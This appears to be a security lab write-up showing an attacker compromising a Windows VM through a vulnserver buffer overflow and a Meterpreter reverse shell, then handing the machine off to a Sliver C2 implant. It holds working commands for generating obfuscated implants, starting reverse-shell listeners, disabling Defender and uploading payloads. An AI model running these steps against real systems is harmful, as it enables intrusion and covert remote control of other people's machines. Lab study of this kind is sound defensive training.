# Malware Command and Control (C2) Lab
# Objective

Demonstrate Attacker A compromising a Victim(1) with a Meterpreter implant(1) and interacting with Victim using the Metasploit C2 Framework.  Then coordinate with Attacker B, which uses the Sliver C2 Framework, to acquire Attacker B’s Sliver implant(2).  Finally, execute Attacker B’s implant(2), transitioning Victim(1) to Attacker B’s Sliver C2 Framework.

# Prereqs: Set up Lab Environment

## VM #1: Attacker A: Kali VM (for Metasploit C2)
- Recommended system requirements:
	- 2 GB of RAM
	- 20 GB of disk space

## VM #2: ​Attacker B: ParrotOS VM (for Sliver C2)
- Recommended system requirements:
	- 2 GHz dual-core processor or better
	- 4 GB system memory
	- 25 GB of free hard drive space
- Install Sliver (https://github.com/BishopFox/sliver)
	- Note: The one liner on the website will wait for you to pass the user password, because: `sudo`.
	- Install Sliver
		- `curl https://sliver.sh/install|sudo bash`

## VM #3: Windows 10 VM (For Exploit Development/dual use as Victim PC)
- Disable Windows Defender


# Procedure

## i. Prepare the C2 machines

On the ParrotOS VM, generate a Sliver payload, and transfer the binary to the Kali VM.  Finally, start the Sliver C2 listener to be ready to catch the Sliver callback from the Victim PC.


```sh
# From the ParrotOS VM, start the Sliver C2 framework:

┌─[bob@parrot]─[~]
└──╼ $sliver
Connecting to localhost:31337 ...

.------..------..------..------..------..------.
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |
| :/\: || :/\: || (\/) || :(): || (\/) || :(): |
| :\/: || (__) || :\/: || ()() || :\/: || ()() |
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'

All hackers gain assist
[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver >

```




```sh
# generate Sliver payload for the Windows victim:
sliver > generate --http <parrotOS ip>:5309 --save ~


[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 1m1s
[*] Implant saved to /home/bob/AVERAGE_SHAMPOO.exe


# Verify the exe location on the ParrotOS VM:
┌─[bob@parrot]─[~]
└──╼ $pwd
/home/bob

$ll
total 17M
-rwx------ 1 bob bob 17M Feb 27 15:04 AVERAGE_SHAMPOO.exe
drwxr-xr-x 1 bob bob  28 Jan 21 14:13 Desktop
drwxr-xr-x 1 bob bob   0 Feb 25 15:13 Documents


# From the Kali VM, acquire the Sliver implant from the Sliver VM
┌──(bob㉿sneaker)-[~/lab_test]
└─$ scp bob@<parrotOS ip>:/home/bob/AVERAGE_SHAMPOO.exe .


# From the ParrotOS VM, start the Sliver listener
sliver > http --lport 5309
[*] Starting HTTP :5309 listener ...
[*] Successfully started job #1


```




## 1. Establish a foothold

Compromise the Victim PC using the previously developed exploit that overflows a buffer in the `vulnserver.exe` program, resulting in Remote Code Execution (RCE) on the Victim PC.  This exploit executes shellcode on the Victim containing the Meterpreter staged implant which causes the Victim to return an interactive session to Attacker A allowing control of the Victim PC via the Metasploit C2 Framework.




Ensure that the vulnerable server is running on Victim PC, and verify that Windows Defender is still disabled.




From the Kali VM, start a Metasploit listener to catch the Meterpreter callback, then exploit the Victim PC.


```sh
# Setup the Metasploit listener
┌──(bob㉿sneaker)-[~/lab_test]
└─$ sudo msfconsole -q -x "use exploit/multi/handler;\set PAYLOAD
windows/meterpreter/reverse_tcp;
\set LHOST 192.168.218.128;\set LPORT 4455;\run"
[sudo] password for bob: 
[*] Using configured payload generic/shell_reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
LHOST => 192.168.218.128
LPORT => 4455
[*] Started reverse TCP handler on 192.168.218.128:4455
```


```sh
# Exploit the Victim PC
┌──(bob㉿sneaker)-[~/lab_test]
└─$ python exploit.py 

[+]Sending evil buffer...

```


```sh
# Observe the first callback, opening a Meterpreter session with the Victim PC:
[*] Sending stage (175686 bytes) to 192.168.218.132
[*] Meterpreter session 1 opened (192.168.218.128:4455 -> 192.168.218.132:49944) 
at 2024-02-28 13:04:07 -0800

meterpreter > 
```

## 2. Transition the Victim to the Sliver C2 Framework


```sh
# Upload the Sliver binary
meterpreter > upload /home/bob/lab_test/AVERAGE_SHAMPOO.exe .

# Notice how much time this takes to upload (recall it is a 17 MB exe file)

[*] Uploading  : /home/bob/lab_test/AVERAGE_SHAMPOO.exe -> .\AVERAGE_SHAMPOO.exe
[*] Completed  : /home/bob/lab_test/AVERAGE_SHAMPOO.exe -> .\AVERAGE_SHAMPOO.exe
meterpreter > 
```

With an interactive Meterpreter session and the Sliver implant on the Victim PC, now we simply execute the Sliver implant and catch the callback on the ParrotOS VM:

```sh

# Observe the callback
# From the ParrotOS VM Sliver listener:


[*] Starting HTTP :5309 listener ...
[*] Successfully started job #1

[*] Session 90046956 AVERAGE_SHAMPOO - 192.168.218.132:50542 (DESKTOP-5RU61SI)
- windows/amd64 - Tue, 27 Feb 2024 15:07:25 EST

sliver > use 90046956-2ea1-4bc3-be91-5a785aa19054

sliver (AVERAGE_SHAMPOO) >

```
